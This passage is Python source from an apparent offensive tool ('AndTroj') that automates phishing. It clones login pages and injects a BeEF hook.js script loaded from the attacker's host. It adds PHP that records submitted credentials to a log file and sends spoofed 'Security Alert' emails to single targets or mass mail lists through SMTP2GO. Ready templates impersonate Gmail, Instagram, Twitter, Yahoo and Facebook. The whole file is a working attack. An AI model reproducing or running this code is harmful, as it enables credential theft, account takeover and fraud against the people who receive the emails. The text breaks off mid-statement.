#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
from core.social_menu import *
from core.start import Tor


dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
template = dir + '/templates/'
protcl = tmp + 'protocol.txt'
ng_url = tmp + 'ngrok_url.txt'
USR_Mail = tmp + 'targetuser.txt'
TTMail = tmp + 'targetmail.txt'
out8 = tmp + 'ngrok.txt'
out9 = tmp + 'ngrok_beef.txt'
kutation = '"'
bslash1 = '\\'
bslash2 = '\\'
bslash = bslash1 + bslash2
slashkutat = bslash1 + kutation


LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])


def mailph():
    global TARGET_MAIL, TARGET_LIST, SUBJECT_MAIL, TARGET_MAIL, MailPhish, LHOST, LGPORT_BEEF, NGHOST
    print "\n"
    subprocess.call(
        'chmod o+w /var/www/html/',
        shell=True)
    subprocess.call(
        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
        shell=True)
    subprocess.call(
        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
        shell=True)
    Tor()
    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                          "\n\t[2] Ngrok CustomURL(Business)"
                          "\n\nroot@unk9vvn:~# ")

    if NGROK_SLT == "1":
        LHOST = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                          "\n\t[?] LHOST: ")
        print "\n"
        subprocess.call(
            'LHOST2 && proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
            shell=True)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        subprocess.call(
            'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
            'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
            shell=True)
        checklog = os.path.exists('/var/www/html/log.txt')
        if checklog == (False):
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        else:
            subprocess.call(
                'rm /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        print "\nI: Please 30 sec waiting...\n"
        time.sleep(15.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(5.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        time.sleep(5.0)
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        Tor()
        print "\nI: Please 10 sec waiting...\n"

        METD_ATTACK = raw_input("\n\t[1] Attack Single"
                                "\n\t[2] Attack Mass"
                                "\n\nroot@unk9vvn:~# ")
        if METD_ATTACK == "1":
            TARGET_MAIL = raw_input("\n\t[i] Example: target@gmail.com\n"
                                    "\t[?] TARGET Mail: ")
            SPOOF_MAIL = raw_input("\n\t[i] Example: support@bank.com\n"
                                   "\t[?] Spoof Mail: ")
            SUBJECT_MAIL = raw_input("\n\t[i] Example: Supporter Message\n"
                                     "\t[?] Subject Mail: ")
            SMTP2GO_USER = raw_input("\n\t[?] SMTP2GO USER: ")
            SMTP2GO_PASS = raw_input("\n\t[?] SMTP2GO PASS: ")
            subprocess.call(
                'echo ' + TARGET_MAIL + ' >> /usr/share/AndTroj/tmp/targetmail.txt',
                shell=True)
            subprocess.call(
                'BAT=$(sed -nE \'s/([^"]*).*@.*/\1/p\' /usr/share/AndTroj/tmp/targetmail.txt) && echo "$BAT" >> /usr/share/AndTroj/tmp/targetuser.txt',
                shell=True)
            s = open(TTMail, "r")
            emailmail = s.readline()
            f = open(USR_Mail, "r")
            usermail = f.readline()
        elif METD_ATTACK == "2":
            TARGET_LIST = raw_input("\n\t[i] Example: /root/Maillist.txt\n"
                                    "\t[?] Maillist: ")
            SPOOF_MAIL = raw_input("\n\t[i] Example: support@bank.com\n"
                                   "\t[?] Spoof Mail: ")
            SUBJECT_MAIL = raw_input("\n\t[i] Example: Supporter Message\n"
                                     "\t[?] Subject Mail: ")
            SMTP2GO_USER = raw_input("\n\t[?] SMTP2GO USER: ")
            SMTP2GO_PASS = raw_input("\n\t[?] SMTP2GO PASS: ")
            subprocess.call(
                'cp ' + TARGET_LIST + ' /usr/share/AndTroj/tmp/targetmail.txt',
                shell=True)
            subprocess.call(
                'BAT=$(sed -nE \'s/([^"]*).*@.*/\1/p\' /usr/share/AndTroj/tmp/targetmail.txt) && echo "$BAT" >> /usr/share/AndTroj/tmp/targetuser.txt',
                shell=True)
            s = open(TTMail, "r")
            emailmail = s.readline()
            f = open(USR_Mail, "r")
            usermail = f.readline()
        else:
            return METD_ATTACK

        METD_MailPhish = raw_input("\n\t[1] CustomURL"
                                   "\n\t[2] Templates"
                                   "\n\nroot@unk9vvn:~# ")
        if METD_MailPhish == "1":
            URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
            chek_index = os.path.exists('/var/www/html/index.php')
            if chek_index == (True):
                subprocess.call(
                    'rm /var/www/html/index.php',
                    shell=True)
            else:
                pass
            subprocess.call(
                'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                shell=True)
            subprocess.call(
                'sed -i \'s#</body>#\\n<script src="http://' + LHOST + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'mv /var/www/html/index.html /var/www/html/index.php',
                shell=True)
            subprocess.call(
                "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + slashkutat + "h:i:s a - Y/m/d" + slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + slashkutat + "]" + bslash1 + "\\\\\\r\\\\\\n" + slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + slashkutat + "\\\\\\r\\\\\\n" + slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                shell=True)
            subprocess.call(
                'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                shell=True)
            HTML = """<div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" 
                             cellpadding="0" width="100%;" id="m_-7319109037895721555email_table" border="0" 
                             style="border-collapse:collapse"><tbody><tr><td id="m_-7319109037895721555email_content" 
                             style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial, 
                             sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" 
                             style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" 
                             colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" 
                             style="line-height:1px"></td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" 
                             style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 
                             0;text-align:center;width:430px"><tbody><tr><td width="15px" style="width:15px"></td><td 
                             style="line-height:0px;width:400px;padding:0 0 15px 0"><table cellspacing="0" cellpadding="0" 
                             style="border-collapse:collapse"><tbody><tr><td 
                             style="width:100%;text-align:left;height:33px"><img height="33" 
                             src="https://encrypted-tbn0.gstatic.com/images?q=tbn 
                             :ANd9GcRTAX9wYDzmmVnzNYftpA06asyIoO8OkpCnw9IbEE9wLx_Lg5N4OA" style="border:0" 
                             class="CToWUd"></td></tr></tbody></table></td><td width="15px" 
                             style="width:15px"></td></tr><tr><td width="15px" style="width:15px"></td><td 
                             style="border-top:solid 1px #c8c8c8"></td><td width="15px" 
                             style="width:15px"></td></tr></tbody></table></td></tr><tr><td><table cellspacing="0" 
                             cellpadding="0" width="430" style="border-collapse:collapse;margin:0 auto 0 
                             auto"><tbody><tr><td><table cellspacing="0" cellpadding="0" width="430px" 
                             style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td width="15" 
                             style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td><table cellspacing="0" 
                             cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td><table 
                             cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td width="20" 
                             style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" 
                             cellpadding="0" style="border-collapse:collapse"><tbody><tr><td><p 
                             style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px">Hi {0}, 
                             </p><p style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px"><span>Change the 
                             password because of the length of time you use your password for more 
                             security</span><span>.</span></p><p style="padding:0;margin:10px 0 10px 
                             0;color:#565a5c;font-size:18px">If this was you, please use the following to log in:</p><p 
                             style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px"><font size="6">Security 
                             Alert!</font></p><p style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px">If 
                             this wasn't you, please <a href="{1}" style="color:#3b5998;text-decoration:none" 
                             target="_blank">change your password</a> to secure your 
                             account.</p></td></tr></tbody></table></td><td width="20" 
                             style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr 
                             ></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td><table 
                             cellspacing="0" cellpadding="0" width="430px" style="border-collapse:collapse;margin:0 auto 0 
                             auto;width:430px"><tbody><tr><td height="30" style="line-height:30px" 
                             colspan="3">&nbsp;</td></tr><tr><td width="20" 
                             style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><div 
                             style="color:#abadae;font-size:12px;margin:0 auto 5px auto">© Company, Way, Menlo Park, 
                             CA 94022</div><div style="color:#abadae;font-size:12px;margin:0 auto 5px auto">This message 
                             was sent to <a style="color:#abadae;text-decoration:underline">{2}</a> and intended for 
                             Member. Not your account? <a href="" style="color:#abadae;text-decoration:underline" 
                             target="_blank">Remove your email</a> from this account.<br></div></td><td width="20" 
                             style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr><tr 
                             ><td height="20" style="line-height:20px" 
                             colspan="3">&nbsp;</td></tr></tbody></table><span><img 
                             src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6 
                             -I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div>""".format(
                TARGET_MAIL, URL, TARGET_MAIL)
            if METD_ATTACK == "1":
                msg = MIMEMultipart('mixed')
                msg['Subject'] = SUBJECT_MAIL
                msg['From'] = SPOOF_MAIL
                msg['To'] = TARGET_MAIL
                text_message = MIMEText('Timeout Account', 'plain')
                html_message = MIMEText(HTML, 'html')
                msg.attach(text_message)
                msg.attach(html_message)
                mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                mailServer.ehlo()
                mailServer.starttls()
                mailServer.ehlo()
                mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                mailServer.sendmail(SPOOF_MAIL, TARGET_MAIL, msg.as_string())
                mailServer.close()
                print "\t[i] Send Mail: {0}".format(TARGET_MAIL)
            elif METD_ATTACK == "2":
                f = open(TARGET_LIST, "r")
                line = f.readline()
                while line:
                    time.sleep(5.0)
                    line = f.readline()
                    msg = MIMEMultipart('mixed')
                    msg['Subject'] = SUBJECT_MAIL
                    msg['From'] = SPOOF_MAIL
                    msg['To'] = TARGET_MAIL
                    text_message = MIMEText('Timeout Account', 'plain')
                    html_message = MIMEText(HTML, 'html')
                    msg.attach(text_message)
                    msg.attach(html_message)
                    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                    mailServer.ehlo()
                    mailServer.starttls()
                    mailServer.ehlo()
                    mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                    mailServer.sendmail(SPOOF_MAIL, line, msg.as_string())
                    mailServer.close()
                    print "\t[i] Send Mail: {0}".format(line)
            sys.exit()

        elif METD_MailPhish == "2":
            MailPhish = raw_input("\n\t[1] Gmail"
                                  "\n\t[2] Instagram"
                                  "\n\t[3] Twitter"
                                  "\n\t[4] Yahoo"
                                  "\n\t[5] Facebook"
                                  "\n\nroot@unk9vvn:~# ")
            if MailPhish == "1":
                TAMPLE_WEB = template + 'gmail/gmail_web.html'
                TAMPLE_POST = template + 'gmail/gmail_post.php'
                TAMPLE_MAIL = template + 'gmail/gmail_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "2":
                TAMPLE_WEB = template + 'instagram/instagram_web.html'
                TAMPLE_POST = template + 'instagram/instagram_post.php'
                TAMPLE_MAIL = template + 'instagram/instagram_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iIiIiIi#' + usermail + '#g\' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "3":
                TAMPLE_WEB = template + 'twitter/twitter_web.html'
                TAMPLE_POST = template + 'twitter/twitter_post.php'
                TAMPLE_MAIL = template + 'twitter/twitter_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "4":
                TAMPLE_WEB = template + 'yahoo/yahoo_web.html'
                TAMPLE_POST = template + 'yahoo/yahoo_post.php'
                TAMPLE_MAIL = template + 'yahoo/yahoo_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "5":
                TAMPLE_WEB = template + 'facebook/facebook_web.html'
                TAMPLE_POST = template + 'facebook/facebook_post.php'
                TAMPLE_MAIL = template + 'facebook/facebook_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            else:
                return MailPhish

            MAIL_HTML = '/var/www/html/mail.html'
            fg = open(MAIL_HTML, "r")
            HTML_MAIL = fg.readlines()
            if METD_ATTACK == "1":
                msg = MIMEMultipart('mixed')
                msg['Subject'] = SUBJECT_MAIL
                msg['From'] = SPOOF_MAIL
                msg['To'] = TARGET_MAIL
                text_message = MIMEText('Timeout Account', 'plain')
                html_message = MIMEText(HTML_MAIL, 'html')
                msg.attach(text_message)
                msg.attach(html_message)
                mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                mailServer.ehlo()
                mailServer.starttls()
                mailServer.ehlo()
                mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                mailServer.sendmail(SPOOF_MAIL, TARGET_MAIL, msg.as_string())
                mailServer.close()
                print "\t[i] Send Mail: {0}".format(TARGET_MAIL)
            elif METD_ATTACK == "2":
                f = open(TARGET_LIST, "r")
                line = f.readline()
                while line:
                    time.sleep(5.0)
                    line = f.readline()
                    msg = MIMEMultipart('mixed')
                    msg['Subject'] = SUBJECT_MAIL
                    msg['From'] = SPOOF_MAIL
                    msg['To'] = TARGET_MAIL
                    text_message = MIMEText('Timeout Account', 'plain')
                    html_message = MIMEText(HTML_MAIL, 'html')
                    msg.attach(text_message)
                    msg.attach(html_message)
                    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                    mailServer.ehlo()
                    mailServer.starttls()
                    mailServer.ehlo()
                    mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                    mailServer.sendmail(SPOOF_MAIL, line, msg.as_string())
                    mailServer.close()
                    print "\t[i] Send Mail: {0}".format(line)
                print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
            sys.exit()
        else:
            return METD_MailPhish

    elif NGROK_SLT == "2":
        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                              "\n\t[?] CustomURL: ")
        print "\n"
        NGHOST = "127.0.0.1"
        subprocess.call(
            'proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
            shell=True)
        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
        if chek_nngk == (False):
            pass
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                shell=True)
        time.sleep(7.0)
        subprocess.call(
            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
            shell=True)
        fs = open(out9)
        length = 5
        LGPORT_BEEF = fs.read(length)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
        if chek_ngk == (True):
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        else:
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
            shell=True)
        checklog = os.path.exists('/var/www/html/log.txt')
        if checklog == (False):
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        else:
            subprocess.call(
                'rm /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        print "\nI: Please 30 sec waiting...\n"
        time.sleep(15.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(5.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        time.sleep(5.0)
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        Tor()
        print "\nI: Please 10 sec waiting...\n"

        METD_ATTACK = raw_input("\n\t[1] Attack Single"
                                "\n\t[2] Attack Mass"
                                "\n\nroot@unk9vvn:~# ")
        if METD_ATTACK == "1":
            TARGET_MAIL = raw_input("\n\t[i] Example: target@gmail.com\n"
                                    "\t[?] TARGET Mail: ")
            SPOOF_MAIL = raw_input("\n\t[i] Example: support@bank.com\n"
                                   "\t[?] Spoof Mail: ")
            SUBJECT_MAIL = raw_input("\n\t[i] Example: Supporter Message\n"
                                     "\t[?] Subject Mail: ")
            SMTP2GO_USER = raw_input("\n\t[?] SMTP2GO USER: ")
            SMTP2GO_PASS = raw_input("\n\t[?] SMTP2GO PASS: ")
            subprocess.call(
                'echo ' + TARGET_MAIL + ' >> /usr/share/AndTroj/tmp/targetmail.txt',
                shell=True)
            subprocess.call(
                'BAT=$(sed -nE \'s/([^"]*).*@.*/\1/p\' /usr/share/AndTroj/tmp/targetmail.txt) && echo "$BAT" >> /usr/share/AndTroj/tmp/targetuser.txt',
                shell=True)
            s = open(TTMail, "r")
            emailmail = s.readline()
            f = open(USR_Mail, "r")
            usermail = f.readline()
        elif METD_ATTACK == "2":
            TARGET_LIST = raw_input("\n\t[i] Example: /root/Maillist.txt\n"
                                    "\t[?] Maillist: ")
            SPOOF_MAIL = raw_input("\n\t[i] Example: support@bank.com\n"
                                   "\t[?] Spoof Mail: ")
            SUBJECT_MAIL = raw_input("\n\t[i] Example: Supporter Message\n"
                                     "\t[?] Subject Mail: ")
            SMTP2GO_USER = raw_input("\n\t[?] SMTP2GO USER: ")
            SMTP2GO_PASS = raw_input("\n\t[?] SMTP2GO PASS: ")
            subprocess.call(
                'cp ' + TARGET_LIST + ' /usr/share/AndTroj/tmp/targetmail.txt',
                shell=True)
            subprocess.call(
                'BAT=$(sed -nE \'s/([^"]*).*@.*/\1/p\' /usr/share/AndTroj/tmp/targetmail.txt) && echo "$BAT" >> /usr/share/AndTroj/tmp/targetuser.txt',
                shell=True)
            s = open(TTMail, "r")
            emailmail = s.readline()
            f = open(USR_Mail, "r")
            usermail = f.readline()
        else:
            return METD_ATTACK

        METD_MailPhish = raw_input("\n\t[1] CustomURL"
                                   "\n\t[2] Templates"
                                   "\n\nroot@unk9vvn:~# ")
        if METD_MailPhish == "1":
            URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
            chek_index = os.path.exists('/var/www/html/index.php')
            if chek_index == (True):
                subprocess.call(
                    'rm /var/www/html/index.php',
                    shell=True)
            else:
                pass
            subprocess.call(
                'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                shell=True)
            subprocess.call(
                'sed -i \'s#</body>#\\n<script src="http://' + LHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
